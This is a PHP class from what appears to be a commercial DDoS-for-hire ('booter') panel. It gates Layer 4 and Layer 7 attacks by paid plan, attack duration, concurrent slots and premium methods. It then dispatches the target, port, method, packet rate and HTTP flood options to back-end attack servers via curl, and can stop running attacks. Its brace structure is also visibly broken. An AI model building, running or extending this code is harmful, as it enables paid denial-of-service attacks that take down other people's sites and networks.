<?php

if(!defined('allow')) {
	header("HTTP/1.0 404 Not Found");
}

if(!defined('test')) {
	die('Bratan slowaris love hentai');
}

class Api {

	public function ApiDataAll() {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `api` ORDER BY `id`");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function AttacksToday() {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `attack_logs` WHERE `date` > :time");
		$DataBase->Bind(":time", time() - 86400);
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet() 
		);

		return $Return;
	}

	public function ApiDataID($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `api` WHERE `id` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataAll() {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api`");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function ApiDataBySlotsL4() {
		global $DataBase;
		global $Api;

		$DataBase->Query("SELECT * FROM `api` WHERE `layer` = '4'");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function ApiDataBySlotsL7() {
		global $DataBase;
		global $Api;

		$DataBase->Query("SELECT * FROM `api` WHERE `layer` = '7'");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function CountApiOfAttacks($id) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `attack_logs` WHERE `handler` = :ID AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		return $DataBase->RowCount();
	}

	public function UserAttacks($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `attack_logs` WHERE `userID` = :ID AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataID($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `api_key` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataUserID($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `userID` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataID2($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `id` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataID3($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `api_key` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function Layer4($Target, $Port, $Time, $Method, $PPS, $Slots) {
		global $DataBase;
		global $User;
		global $Plan;
		global $Secure;
		global $Api;
		global $ALogs;
		global $BlackList;
		global $Methods;

		$Addons = explode('|', $User->UserData()['addons']);

		if($User->UserData()['expire'] < time()) {
			$rMsg = ['error', 'Your Plan is expired.'];
			echo json_encode($rMsg);
			die();
		}

		if (!filter_var($Target, FILTER_VALIDATE_IP)) {
			$rMsg = ['error', 'Target is invalid.'];
			echo json_encode($rMsg);
			die();
		}

		if($Port < 1 || $Port > 65535) {
			$rMsg = ['error', 'Port must be higher than 1 and lower than 65535.'];
			echo json_encode($rMsg);
			die();
		}

		if($Time > $Plan->PlanDataID($User->UserData()['plan'])['mbt'] + $Addons[0]) {
			$rMsg = ['error', 'Your maximum attack duration is '.$Plan->PlanDataID($User->UserData()['plan'])['mbt']+$Addons[0].'.'];
			echo json_encode($rMsg);
			die();
		}


		if($Methods->MethodsDataID($Method)['layer'] != 4) {
			$rMsg = ['error', 'This method doesnt exist.'];
			echo json_encode($rMsg);
			die();
		}


		if($Methods->MethodsDataID($Method)['premium'] != 0) {
			if($Plan->PlanDataID($User->UserData()['plan'])['ID'] == 1) {
				$rMsg = ['error', 'This method requires paid plan.'];
				echo json_encode($rMsg);
				die();
			}
		}

		if($Methods->MethodsDataID($Method)['premium'] == 2) {
			if($Plan->PlanDataID($User->UserData()['plan'])['premium'] != 1) {
				$rMsg = ['error', 'This method requires premium plan.'];
				echo json_encode($rMsg);
				die();
			}
		}


		if($Plan->PlanDataID($User->UserData()['plan'])['ID'] == 1) {
			if ($ALogs->LogsDataRunning($Target)['Count'] >= 1) {
				$rMsg = ['error', 'This target is already under attack.'];
				echo json_encode($rMsg);
				die();
			}
		}
		
		foreach ($BlackList->BlackListDataAll()['Response'] as $BLk => $BLv) {
			if(strpos($Target, $BLv['word'])) {
				$Message = $BLv['detail'];
				if($BLv['expires'] > time()) {
					$rMsg = ['error', "$Message"];
					echo json_encode($rMsg);
					die();
				}
			}
		}

		$MethodSource = $Methods->MethodsDataID($Method)['name'];

		$load = "";
		for ($i=0; $i < $Slots; $i++) { 
			if($ALogs->UserAttacks($User->UserData()['id'])['Count'] >= $Plan->PlanDataID($User->UserData()['plan'])['concurrents'] + $Addons[1]) {
				$rMsg = ['error', 'You have exceeded your total slots in running.'];
				echo json_encode($rMsg);
				die();
			}

			foreach ($Api->ApiDataAll()['Response'] as $k => $v) {
				if($v['layer'] == 4) { if($v['status'] == false) { 
					$MethodList = $Api->ApiDataID($v['id'], 1)['methods'];

					$MethodeExpl = explode('|', $MethodList);

					foreach ($MethodeExpl as $MethodName) {
						if ($MethodName == $MethodSource) {
							$loaded = ($Api->CountApiOfAttacks($v['id']) / $v['slots']) * 100;
							if ($loaded != 100) {
								$load = $load . $loaded . ",";
							}
						}
					}
				}
			}
		}

		$num = explode(",", $load);
		$sm = $num[0];

		foreach ($num as $numb) {
			if ($numb < $sm) {
				$sm = $numb;
			}
		}

		foreach ($Api->ApiDataAll()['Response'] as $k => $v) {
			if($v['layer'] == 4) { if($v['status'] == false) { 
				$MethodList = $Api->ApiDataID($v['id'], 1)['methods'];

				$MethodeExpl = explode('|', $MethodList);

				foreach ($MethodeExpl as $MethodName) {
					if ($MethodName == $MethodSource) {
						$loadednew = ($Api->CountApiOfAttacks($v['id']) / $v['slots']) * 100;
						if (number_format((float)$num[0], 2) >= number_format($loadednew, 2)) {
							$serverID = $v['id'];
							break;
						}
					}
				}
			}
		}
	}

	if (empty($serverID)) {
		$eMSG = ['error', "All servers are busy, please wait."];
		echo json_encode($eMSG);
		die();
	}
	if ($Api->CountApiOfAttacks($serverID) >= $Api->ApiDataID($serverID, 1)['slots']) {
		$eMSG = ['error', "All servers are busy, please wait."];
		echo json_encode($eMSG);
		die();
	}
	$Stopper[$i] = rand(1000000, 9999999);

// Start Function
	$ch = curl_init($Secure->AdminSecureTxt($Api->ApiDataID($serverID, 1)['link'])."&Target=$Target&Port=$Port&Time=$Time&Method=".$Methods->MethodsDataID($Method)['name']."&PPS=$PPS&stopper=".$Stopper[$i]."&stop=0");

// curl_setopt($ch, CURLOPT_URL, $urlis);
	curl_setopt($ch, CURLOPT_TIMEOUT, 5);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$data = curl_exec($ch);

	$info = curl_getinfo($ch);

	if(curl_errno($ch)) {
		$rMsg = ['error', 'Error 1! Please contanct support! Server: '.$Api->ApiDataID($serverID, 1)['name']];
		echo json_encode($rMsg);
		die();
	}

	curl_close($ch);

	if ($data === FALSE) {
		$rMsg = ['error', 'API Error 2! Please contact support! Server: '.$Api->ApiDataID($serverID, 1)['name']];
		echo json_encode($rMsg);
		die();
	}

// Message
	$response = json_decode($data, true);
// $status = $response['status'];
	$status = 'true';
	$message = $response['message'];

	if($status == 'true') {
// Log
		$ALogs->CreateLog($User->UserData()['id'],$Target, $Time, $Port, '0', '0', $Method, '0', '0', '0', '0', '0', '0', '0', $Stopper[$i], $Api->ApiDataID($serverID, 1)['id'], '4');
		$_SESSION['token'] = bin2hex(random_bytes(32));
	} else if($status == 'false') {
		$rMsg = ['error', "$message"];
		echo json_encode($rMsg);
		die();
	} else {
		$rMsg = ['warning', 'Error. Please contact support! Server: '.$Api->ApiDataID($serverID, 1)['name']];
		echo json_encode($rMsg);
		die();
	}
}

$rMsg = ['success', "$message"];
echo json_encode($rMsg);
die();
}

public function Layer7($Target, $Time, $Method, $ReqMethod, $PostData, $Rate, $HData, $Delay, $Http, $PreCheck, $Emulation, $Captcha, $Slots) {
	global $DataBase;
	global $Secure;
	global $User;
	global $Plan;
	global $Api;
	global $ALogs;
	global $BlackList;
	global $Methods;

	$Addons = explode('|', $User->UserData()['addons']);

	if($User->UserData()['expire'] < time()) {
		$rMsg = ['error', 'Your Plan is expired.'];
		echo json_encode($rMsg);
		die();
	}

	if(filter_var($Target, FILTER_VALIDATE_IP)) {
		$Target = 'http://'.$Target;
	}

	if (filter_var($Target, FILTER_VALIDATE_URL) === false) {
		$rMsg = ['error', 'Target is invalid.'];
		echo json_encode($rMsg);
		die();
	}


	$time = $Plan->PlanDataID($User->UserData()['plan'])['mbt'] + $Addons[0];
	if($Time > $time) {
		$rMsg = ['error', 'Your maximum boot time is '.$time.'.'];
		echo json_encode($rMsg);
		die();
	}


	if(!($Methods->MethodsDataID($Method)['layer']) == 7) {
		$rMsg = ['error', 'This method doesnt exist.'];
		echo json_encode($rMsg);
		die();
	}

	if($Methods->MethodsDataID($Method)['premium'] != 0) {
		if($Plan->PlanDataID($User->UserData()['plan'])['ID'] == 1) {
			$rMsg = ['error', 'This method requires paid plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	if($Plan->PlanDataID($User->UserData()['plan'])['ID'] == 1) {
		 $Domain = parse_url($Target, PHP_URL_HOST);
		if ($ALogs->AbuseCheck($Domain)['Count'] >= 1) {
			$rMsg = ['error', 'This target is already under attack.'];
			echo json_encode($rMsg);
			die();
		}
	}

	if($Methods->MethodsDataID($Method)['premium'] == 2) {
		if($Plan->PlanDataID($User->UserData()['plan'])['premium'] != 1) {
			$rMsg = ['error', 'This method requires premium plan.'];
			echo json_encode($rMsg);
			die();
		}
	}


	foreach ($BlackList->BlackListDataAll()['Response'] as $BLk => $BLv) {
		if(strpos($Target, $BLv['word'])) {
			$Message = $BLv['detail'];
			if($BLv['expires'] > time()) {
				$rMsg = ['error', "$Message"];
				echo json_encode($rMsg);
				die();
			}
		}
	}

	$MethodSource = $Methods->MethodsDataID($Method)['name'];

	$load = "";
	for ($i=0; $i < $Slots; $i++) { 
		if($ALogs->UserAttacks($User->UserData()['id'])['Count'] >= $Plan->PlanDataID($User->UserData()['plan'])['concurrents'] + $Addons[1]) {
			$rMsg = ['error', 'You have exceeded your total slots in running.'];
			echo json_encode($rMsg);
			die();
		}

		foreach ($Api->ApiDataAll()['Response'] as $k => $v) {
			if($v['layer'] == 7) { if($v['status'] == false) { 
				$MethodList = $Api->ApiDataID($v['id'], 1)['methods'];

				$MethodeExpl = explode('|', $MethodList);

				foreach ($MethodeExpl as $MethodName) {
					if ($MethodName == $MethodSource) {
						$loaded = ($Api->CountApiOfAttacks($v['id']) / $v['slots']) * 100;
						if ($loaded != 100) {
							$load = $load . $loaded . ",";
						}
					}
				}
			}
		}
	}

	$num = explode(",", $load);
	$sm = $num[0];

	foreach ($num as $numb) {
		if ($numb < $sm) {
			$sm = $numb;
		}
	}

	foreach ($Api->ApiDataAll()['Response'] as $k => $v) {
		if($v['layer'] == 7) { if($v['status'] == false) { 
			$MethodList = $Api->ApiDataID($v['id'], 1)['methods'];

			$MethodeExpl = explode('|', $MethodList);

			foreach ($MethodeExpl as $MethodName) {
				if ($MethodName == $MethodSource) {
					$loadednew = ($Api->CountApiOfAttacks($v['id']) / $v['slots']) * 100;
					if (number_format((float)$num[0], 2) >= number_format($loadednew, 2)) {
						$serverID = $v['id'];
						break;
					}
				}
			}
		}
	}
}

if (empty($serverID)) {
	$eMSG = ['error', "All servers are busy, please wait."];
	echo json_encode($eMSG);
	die();
}
if ($Api->CountApiOfAttacks($serverID) >= $Api->ApiDataID($serverID, 1)['slots']) {
	$eMSG = ['error', "All servers are busy, please wait."];
	echo json_encode($eMSG);
	die();
}
$Stopper[$i] = rand(1000000, 9999999);

// Start Function
$ch = curl_init($Secure->AdminSecureTxt($Api->ApiDataID($serverID, 1)['link'])."&Target=".urlencode($Target)."&Time=$Time&Method=".$Methods->MethodsDataID($Method)['name']."&ReqMethod=$ReqMethod&PostData=$PostData&Rate=$Rate&HData=".urlencode($HData)."&Delay=$Delay&Http=$Http&PreCheck=$PreCheck&Emulation=$Emulation&Captcha=$Captcha&stopper=".$Stopper[$i]."&stop=0");

curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("cache-control: no-cache", "content-type: application/x-www-form-urlencoded"));

$data = curl_exec($ch);

$info = curl_getinfo($ch);

if(curl_errno($ch)) {
	$rMsg = ['error', 'Server is busy, please wait a moment! ID: '.$Api->ApiDataID($serverID, 1)['name']];
	echo json_encode($rMsg);
	die();
}

curl_close($ch);

if ($data === FALSE) {
	$rMsg = ['error', 'Server return error please contact support! ID: '.$Api->ApiDataID($serverID, 1)['name']];
	echo json_encode($rMsg);
	die();
}

// Message
$response = json_decode($data, true);
$status = $response['status'];
$message = $response['message'];

if($status == 'true') {
// Log
	$Domain = parse_url($Target, PHP_URL_HOST);

	$ALogs->CreateLog($User->UserData()['id'], $Domain, $Time, '0', $ReqMethod, $PostData, $Method, $Rate, $HData, $Delay, $Http, $PreCheck, $Emulation, $Captcha, $Stopper[$i], $Api->ApiDataID($serverID, 1)['id'], '7');

	$_SESSION['token'] = bin2hex(random_bytes(32));
} else if($status == 'false') {
	$rMsg = ['error', "$message"];
	echo json_encode($rMsg);
	die();
} else {
	$rMsg = ['warning', 'Error. Please contact support!'];
	echo json_encode($rMsg);
	die();
}
}

$rMsg = ['success', "$message"];
echo json_encode($rMsg);
die();
}


public function Stop($ID) {
	global $DataBase;
	global $ALogs;
	global $Api;
	global $User;
	global $Secure;

	if($User->UserData()['expire'] < time()) {
		$rMsg = ['error', 'Your Plan is expired.'];
		echo json_encode($rMsg);
		die();
	}

	$Stopper = $ALogs->LogsDataID($ID, 1)['stopper'];

		// Stop Function
	$ch = curl_init($Secure->AdminSecureTxt($Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'] , 1)['link'])."&stopper=$Stopper&stop=1");
		// curl_setopt($ch, CURLOPT_URL, $urlis);
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("cache-control: no-cache", "content-type: application/x-www-form-urlencoded"));

	$data = curl_exec($ch);

	$info = curl_getinfo($ch);

	if(curl_errno($ch)) {
		$rMsg = ['error', 'API Error 1! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
		echo json_encode($rMsg);
		die();
	}

	curl_close($ch);

	if ($data === FALSE) {
		$rMsg = ['error', 'API Error 2! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
		echo json_encode($rMsg);
		die();
	}

		// Message
	$response = json_decode($data, true);
	$status = $response['status'];
	$message = $response['message'];

	if($status == 'true') {
		$DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:uID");
		$DataBase->Bind(':uID', $ID);

		$update = $DataBase->Execute();

		if($update == false) {
			$rMsg = ['error', 'Error on update! Please contact Support!'];
			echo json_encode($rMsg);
			die();
		}

		$_SESSION['token'] = bin2hex(random_bytes(32));

		$rMsg = ['success', "$message"];
		echo json_encode($rMsg);
		die();
	} else if($status == 'false') {
		$rMsg = ['error', "$message"];
		echo json_encode($rMsg);
		die();
	} else {
		$rMsg = ['warning', 'Error. Please contact support!'];
		echo json_encode($rMsg);
		die();
	}
}

public function StopAll() {
	global $DataBase;
	global $Logs;
	global $Api;
	global $ALogs;
	global $User;
	global $Secure;

	if($User->UserData()['expire'] < time()) {
		$rMsg = ['error', 'Your Plan is expired.'];
		echo json_encode($rMsg);
		die();
	}

	foreach ($ALogs->UserAttacks($User->UserData()['id'])['Response'] as $Ak => $Av) {
		$Stopper = $ALogs->LogsDataID($Av['id'], 1)['stopper'];

			// Stop Function
		$ch = curl_init($Secure->AdminSecureTxt($Api->ApiDataID($ALogs->LogsDataID($Av['id'], 1)['handler'], 1)['link'])."&stopper=$Stopper&stop=1");

		curl_setopt($ch, CURLOPT_TIMEOUT, 15);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("cache-control: no-cache", "content-type: application/x-www-form-urlencoded"));

		$data = curl_exec($ch);

		$info = curl_getinfo($ch);

		if(curl_errno($ch)) {
			$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($Av['id'], 1)['handler'], 1)['name']];
			echo json_encode($rMsg);
			die();
		}

		curl_close($ch);

		if ($data === FALSE) {
			$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($Av['id'], 1)['handler'], 1)['name']];
			echo json_encode($rMsg);
			die();
		}

			// Message
		$response = json_decode($data, true);
		$status = $response['status'];
		$message = $response['message'];

		if($status == 'true') {
			$DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:uID");
			$DataBase->Bind(':uID', $Av['id']);

			$update = $DataBase->Execute();

			if($update == false) {
				$rMsg = ['error', 'Error on update! Please contact Support!'];
				echo json_encode($rMsg);
				die();
			}

				// Log
			$_SESSION['token'] = bin2hex(random_bytes(32));
		} else if($status == 'false') {
			$rMsg = ['error', "$message"];
			echo json_encode($rMsg);
			die();
		} else {
			$rMsg = ['warning', 'Error. Please contact support!'];
			echo json_encode($rMsg);
			die();
		}
	}

	$rMsg = ['success', "$message"];
	echo json_encode($rMsg);
	die();
}

public function AdminStop($ID) {
	global $DataBase;
	global $ALogs;
	global $Api;
	global $Secure;

	$Stopper = $ALogs->LogsDataID($ID, 1)['stopper'];

		// Stop Function
	$ch = curl_init($Secure->AdminSecureTxt($Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'] , 1)['link'])."&stopper=$Stopper&stop=1");

	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("cache-control: no-cache", "content-type: application/x-www-form-urlencoded"));
	$data = curl_exec($ch);

	$info = curl_getinfo($ch);

	if(curl_errno($ch)) {
		$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
		echo json_encode($rMsg);
		die();
	}

	curl_close($ch);

	if ($data === FALSE) {
		$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
		echo json_encode($rMsg);
		die();
	}

		// Message
	$response = json_decode($data, true);
	$status = $response['status'];
	$message = $response['message'];

	if($status == 'true') {
		$DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:uID");
		$DataBase->Bind(':uID', $ID);

		$update = $DataBase->Execute();

		if($update == false) {
			$rMsg = ['error', 'Error on update'];
			echo json_encode($rMsg);
			die();
		}

		$rMsg = ['success', "$message"];
		echo json_encode($rMsg);
		die();
	} else if($status == 'false') {
		$rMsg = ['error', "$message"];
		echo json_encode($rMsg);
		die();
	} else {
		$rMsg = ['warning', 'Error!'];
		echo json_encode($rMsg);
		die();
	}
}




public function NewApiAccess($Time, $Slots, $Mode, $Ips) {
	global $DataBase;
	global $Api;
	global $Plan;
	global $Logs;
	global $Secure;
	global $User;

	if($Plan->PlanDataID($User->UserData()['Plan'])['API'] != 1) {
		$rMsg = ['error', 'You need Premium plan to use API.'];
		echo json_encode($rMsg);
		die();
	}

	$Addons = explode('|', $User->UserData()['Addons']);

	if($Mode == 2) {
		if($Addons[3] == 0) {
			$rMsg = ['error', 'You need Turbo to use Turbo mode.'];
			echo json_encode($rMsg);
			die();
		}
	}

	if($Plan->PlanDataID($User->UserData()['Plan'])['AttackTime']+$Addons[0] < $Time || $Time < 30) {
		$rMsg = ['error', 'Invalid Time.'];
		echo json_encode($rMsg);
		die();
	}

	if($Plan->PlanDataID($User->UserData()['Plan'])['Concurrent']+$Addons[1] < $Slots || $Slots < 1) {
		$rMsg = ['error', 'Invalid Slots.'];
		echo json_encode($rMsg);
		die();
	}

	$IpExplode = explode('|',$Secure->ApiIps($Ips));

	if(!empty($Ips)) {
		if(!filter_var(@$IpExplode[0], FILTER_VALIDATE_IP)) {
			$rMsg = ['error', 'First is invalid.'];
			echo json_encode($rMsg);
			die();
		}

		if(!empty(@$IpExplode[1])) {
			if(!filter_var(@$IpExplode[1], FILTER_VALIDATE_IP)) {
				$rMsg = ['error', 'Second is invalid.'];
				echo json_encode($rMsg);
				die();
			}
		}

		if(!empty(@$IpExplode[2])) {
			if(!filter_var(@$IpExplode[2], FILTER_VALIDATE_IP)) {
				$rMsg = ['error', 'Third ip is invalid.'];
				echo json_encode($rMsg);
				die();
			}
		}
	}

// Define
	$userID = $User->UserData()['id'];

// Define
	$api_key = $Secure->RandKey(10);
	$wl = @$IpExplode[0]."|".@$IpExplode[1]."|".@$IpExplode[2];

	if($Api->UsersApiDataID($userID, 0)['Count'] < 5) {
// Insert in DB
		$DataBase->Query("INSERT INTO `users_api` (`id`, `userID`, `AttackTime`, `Slots`, `Mode`, `api_key`,  `WhiteList`) VALUES (NULL, :userID, :AttackTime, :Slots, :Mode, :api_key, :WhiteList);");
		$DataBase->Bind(':userID', $userID);
		$DataBase->Bind(':AttackTime', $Time);
		$DataBase->Bind(':Slots', $Slots);
		$DataBase->Bind(':Mode', $Mode);
		$DataBase->Bind(':api_key', $api_key);
		$DataBase->Bind(':WhiteList', $wl);

		$return = $DataBase->Execute();

// Log
		$Logs->CreateLog($User->UserData()['id'], 'User generated API Key.');
	} else {
		$rMsg = ['error', 'You can have maximum 5 API`s.'];
		echo json_encode($rMsg);
		die();
	}

	if($return == false) {
		$rMsg = ['error', 'Error.'];
		echo json_encode($rMsg);
		die();
	} else {
		$rMsg = ['success', 'Successfully Executed.'];
		$_SESSION['token'] = bin2hex(random_bytes(32));
		echo json_encode($rMsg);
		die();
	}
}

public function RemoveApi($ID) {
	global $DataBase;
	global $User;
	global $Logs;

// Insert in DB
	$DataBase->Query("DELETE FROM `users_api` WHERE `id`=:ID");
	$DataBase->Bind(':ID', $ID);

	$return = $DataBase->Execute();

// Log
	$Logs->CreateLog($User->UserData()['id'], 'User removed API Key.');

	if($return == false) {
		$rMsg = ['error', 'Error.'];
		echo json_encode($rMsg);
		die();
	} else {
		$rMsg = ['success', 'Successfully Executed.'];
		$_SESSION['token'] = bin2hex(random_bytes(32));
		echo json_encode($rMsg);
		die();
	}
}

public function AddAPI($name, $link, $slots, $methods, $layer, $status, $lastUsed) {
	global $DataBase;
	global $Secure;

// Insert in Base
	$DataBase->Query("INSERT INTO `api` (`id`, `name`, `link`, `slots`, `methods`, `layer`,  `status`, `lastUsed`) VALUES (NULL, :name, :link, :slots, :methods, :layer, :status, :lastUsed);");
	$DataBase->Bind(':name', $name);
	$DataBase->Bind(':link', $link);
	$DataBase->Bind(':slots', $slots);
	$DataBase->Bind(':methods', $methods);
	$DataBase->Bind(':layer', $layer);
	$DataBase->Bind(':status', $status);
	$DataBase->Bind(':lastUsed', $lastUsed);

	return $DataBase->Execute();
}

public function ChangeAPI($Name,  $Link, $Layer, $Slots, $Methods, $status, $id) {
	global $DataBase;

	$DataBase->Query("UPDATE `api` SET `name`=:name, `link`=:link, `layer`=:layer, `slots`=:slots, `methods`=:methods, `status`=:status WHERE `id`=:uID");
	$DataBase->Bind(':name', $Name);
	$DataBase->Bind(':link', $Link);
	$DataBase->Bind(':layer', $Layer);
	$DataBase->Bind(':slots', $Slots);
	$DataBase->Bind(':methods', $Methods);
	$DataBase->Bind(':status', $status);
	$DataBase->Bind(':uID', $id);

	return $DataBase->Execute();
}

public function DeleteAPI($id) {
	global $DataBase;

	$DataBase->Query("DELETE FROM `api` WHERE `id`=:uID");
	$DataBase->Bind(':uID', $id);

	return $DataBase->Execute();
}

}

?>